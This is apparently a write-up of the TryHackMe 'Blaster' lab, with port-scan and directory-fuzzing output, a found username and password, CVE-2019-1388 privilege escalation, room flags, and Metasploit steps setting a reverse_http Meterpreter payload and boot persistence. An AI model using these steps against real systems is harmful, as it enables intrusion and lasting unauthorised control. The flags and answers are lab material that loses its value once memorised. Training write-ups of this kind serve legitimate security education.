# Blaster

## Activate Forward Scanners and Launch Proton Torpedoes

Now that the target is launched, let's perform some enumeration.

```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/gabriel/snap/rustscan/28/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.208.168:80
Open 10.10.208.168:3389
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] 
Starting Nmap 7.60 ( https://nmap.org ) at 2021-04-12 18:05 BST
NSE: Loaded 146 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
Initiating Ping Scan at 18:05
Scanning 10.10.208.168 [2 ports]
Completed Ping Scan at 18:05, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:05
Completed Parallel DNS resolution of 1 host. at 18:05, 0.03s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 18:05
Scanning 10.10.208.168 [2 ports]
Discovered open port 80/tcp on 10.10.208.168
Discovered open port 3389/tcp on 10.10.208.168
Completed Connect Scan at 18:05, 0.04s elapsed (2 total ports)
Initiating Service scan at 18:05
Scanning 2 services on 10.10.208.168
Completed Service scan at 18:05, 11.12s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.208.168.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.86s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
Nmap scan report for 10.10.208.168
Host is up, received syn-ack (0.038s latency).
Scanned at 2021-04-12 18:05:08 BST for 12s

PORT     STATE SERVICE       REASON  VERSION
80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| ssl-cert: Subject: commonName=RetroWeb
| Issuer: commonName=RetroWeb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-12-02T03:59:43
| Not valid after:  2021-06-03T03:59:43
| MD5:   7aaa 5ce4 b8eb ade9 63c0 efde 3bf4 5ba5
| SHA-1: 9c23 4ee0 9cfe cf89 9a2d 238d 9c74 ac11 ddb0 535f
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQOH6yRE1v875EMi2zHYT+0DANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZXRyb1dlYjAeFw0yMDEyMDIwMzU5NDNaFw0yMTA2MDMwMzU5
| NDNaMBMxETAPBgNVBAMTCFJldHJvV2ViMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAyUFLCQUv8pCbbHAjxhMZdo37kK+A6wJ1SpTi4bpuY+AsF2XPif1z
| HlWNjOFK4Gu0Q1GpbymSpRND3VEjb0dzvfdL5pYMRlCsN28p+60U9xTtr0aeyXEC
| L7tpqxpDHs+FBucdse6Zhyoh93/ZoHO91iqyapkMBuU4usckAstRBZjO9ef1H0KS
| AV0SRrrZdNa6N4LGHLkFNK2W/ljuQHWKJFrPHVAJPlMawb6rFGd68jBufek9oEdP
| ehvAC5trB/OXK1j9TuhOCbjHm71EG1UISWGRnCIqqkFs9fMkv5XlTVzKsyYCIQKn
| cmsKB6eMQvJEhQrjYmLsHvadyuyoTMZlDwIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAFEqXWKvlRAb
| L1Kwk6yDjs+uD7oPfJDonMICM+lQ0oldHL9k2v3tk7k2q2B3IZHrtywiw/c2kp+S
| Q77NEO4DChFvZAW1mSVYxliRiBFGNXF5KyCjZT2nvQzxTAFRpfbACy+Vo1AplhrG
| QhMFH6Wx2YduZe9XojN0FWo62hwFlltFh7QzMQTH4RQheszeu0QScHsZEICk0DCp
| gS8n0E7xXxEYvAmQDhTggXjbCz5LsUwWV+BZqk+VPseAd9iVXmgX5cyNZ5Os66iy
| 1ExwlGKZVVlt4zoSH2Qg7LJzWpJoMFKnb6fui0dPoRDsFV0gfxaptHB78nvT0pTn
| g1HbIFcsrDA=
|_-----END CERTIFICATE-----
|_ssl-date: 2021-04-12T17:05:19+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 18:05
Completed NSE at 18:05, 0.00s elapsed
Read data files from: /snap/rustscan/28/usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.63 seconds
```

```
=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.208.168/
[+] Threads      : 40
[+] Wordlist     : /opt/wordlist/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2021/04/12 18:03:50 Starting gobuster
=====================================================
/retro (Status: 301)
/Retro (Status: 301)
2021/04/12 18:14:27 Finished
=====================================================
=====================================================
```

```
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.208.168
+ Target Hostname:    10.10.208.168
+ Target Port:        80
+ Start Time:         2021-04-12 18:03:18 (GMT1)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/10.0
+ Server leaks inodes via ETags, header found with file /, fields: 0xbfffe59b22aed51:0 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server banner has changed from 'Microsoft-IIS/10.0' to 'Microsoft-HTTPAPI/2.0' which may suggest a WAF, load balancer or proxy is in place
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2021-04-12 18:15:03 (GMT1) (705 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

    1. How many ports are open on our target system

2

    2. Looks like there's a web server running, what is the title of the page we discover when browsing to it?

IIS Windows Server

    3. Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover?

`/retro`

    4. Navigate to our discovered hidden directory, what potential username do we discover?

Wade

    5. Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?

parzival

    6. Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt. What are it's contents?

THM{HACK_PLAYER_ONE}

## Breaching The Control Room

Now that access to the target system has been achieved, let's attempt to escalate. Scout the system and see if we can find anything of interest.

    1. When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?

CVE-2019-1388

    2. Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?

`hhupd`

    3. Research vulnerability and how to exploit it. Exploit it now to gain an elevated terminal!

No answer needed - [this method](https://www.youtube.com/watch?v=3BQKpPNlTSo "Youtube")

    4. Now that we've spawned a terminal, let's go ahead and run the command 'whoami'. What is the output of running this?

nt authority\system

    5. Now that we've confirmed that we have an elevated prompt, read the contents of root.txt on the Administrator's desktop. What are the contents? Keep your terminal up after exploitation so we can use it in task four!

THM{COIN_OPERATED_EXPLOITATION}

## Adoption into the Collective

    1. Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.

No answer needed.

    2. First, let's set the target to PSH (PowerShell). Which target number is PSH?

2
 
    3. After setting your payload, set your lhost and lport accordingly such that you know which port the MSF web server is going to run on and that it'll be running on the TryHackMe network.

No answer needed

    4. Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'.

No answer needed

    5. Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup. 

`run persistence -X`

    6. Run this command now with options that allow it to connect back to your host machine should the system reboot. Note, you'll need to create a listener via the handler exploit to allow for this remote connection in actual practice. Congrats, you've now gain full control over the remote host and have established persistence for further operations!

No answer needed.

Windows Defender keeps getting in the way, regardless of the method I use to transfer it over.